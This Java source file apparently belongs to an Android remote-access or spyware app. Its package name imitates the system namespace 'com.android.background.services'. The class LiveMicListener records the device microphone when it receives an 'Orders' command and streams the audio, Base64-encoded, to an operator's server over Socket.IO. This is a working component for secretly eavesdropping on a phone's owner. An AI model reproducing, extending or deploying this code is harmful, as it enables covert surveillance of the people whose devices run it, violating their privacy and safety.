package com.android.background.services.helpers;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.background.services.params.Orders;

import java.util.Arrays;

import io.socket.client.Socket;

public class LiveMicListener {

    private static final int REQUEST_RECORD_AUDIO_PERMISSION = 200;
    private static final int SAMPLE_RATE = 44100;
    private static final int CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO;
    private static final int AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT;
    private static AudioRecord audioRecord;
    private static boolean isRecording;
    private final Context context;
    private final Socket ioSocket;

    public LiveMicListener(Context context, Socket ioSocket) {
        this.context = context;
        this.ioSocket = ioSocket;
    }

    public void listenLiveMic() {
        if (isRecording) {
            new Thread(()-> ioSocket.emit(Orders.AUDIO_DATA_STOP, "stop")).start();
            audioRecord.stop();
            isRecording = false;
        } else {
            initializeAudioRecording();
            isRecording = true;
        }
    }

    private boolean checkMicPermission() {
        int permission = ContextCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO);
        if (permission != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions((Activity) context, new String[]{android.Manifest.permission.RECORD_AUDIO}, REQUEST_RECORD_AUDIO_PERMISSION);
            return false;
        }
        return true;
    }

    private void initializeAudioRecording() {

        if (checkMicPermission()) {
            int minBufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT);
            audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, minBufferSize);

            if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
                audioRecord.startRecording();
                // Start recording and sending audio data to the server
                startAudioStream();
            } else {
                Log.e("AudioStream", "Audio recording initialization failed.");
                new Thread(()-> ioSocket.emit(Orders.AUDIO_DATA_ERROR, "Audio recording initialization failed.")).start();
            }
        } else {
            Log.d("Madara", "Microphone permission required.");
            new Thread(()-> ioSocket.emit(Orders.AUDIO_DATA_ERROR, "Microphone permission required.")).start();
        }
    }

    private void startAudioStream() {
        final int bufferSize = 4096; // Adjust buffer size as needed
        final byte[] audioData = new byte[bufferSize];

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                    audioRecord.read(audioData, 0, bufferSize);
                    byte[] sendData = Arrays.copyOf(audioData, audioData.length);
                    sendAudioData(sendData);
                }
            }
        }).start();
    }

    private void sendAudioData(byte[] audioData) {
        String audioDataString = Base64.encodeToString(audioData, Base64.NO_WRAP);
        ioSocket.emit(Orders.AUDIO_DATA, audioDataString);
    }
}
